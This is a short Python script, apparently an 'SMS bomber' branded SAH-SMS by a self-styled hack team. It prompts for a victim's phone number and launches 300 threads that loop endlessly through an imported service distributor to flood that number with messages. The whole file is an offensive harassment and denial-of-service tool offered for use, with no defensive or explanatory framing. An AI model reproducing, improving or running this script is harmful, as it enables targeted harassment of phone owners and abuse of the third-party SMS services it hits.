import sys, os, pyfiglet
from AevService import Distribution_Service
from threading import Thread
from colorama import Fore

attack_number_phone = Distribution_Service()

def start(phone):
        attack_number_phone.phone(phone)

        while True:
            try:
                attack_number_phone.random_service()
            except Exception as ex:
                print(ex)

os.system('clear')

print(Fore.YELLOW + pyfiglet.figlet_format("SAH-SMS"))

print('''
     _________________
    /                 \
    |                 |
    | .-----.   .--.  |
    | | SAH |  /    \ |
    | '-----'  \    / |
    |           |  |  |
    | LI LI LI  |  |  |
    | LI LI LI  |  |  |
    | LI LI LI  |  |  |
    | LI LI LI  |  |  |
    |           |  |  |
    | .------. /    \ |
    | | SAH  | \    / |
    | '------'  '--'  |
    |          .----. |
    |          ||  || |
    |          |'--'| |
    |          '----' |
    \_________________/
''')

print('============')
print(Fore.BLUE + '++++++++++++++++++')
print(Fore.RED + 'SHOLD AYRZ HACK TEAM')
print(Fore.BLUE + '++++++++++++++++++')
print(Fore.YELLOW + '============')
phone = input('NUMBER: ')
print('============')

try:
        attack_number_phone.phone(phone)
except:
        print(Fore.RED + 'Try Again Ö: +905551235500')
        sys.exit()


for i in range(300):
        th = Thread(target=start, args=(phone,))
        th.start()
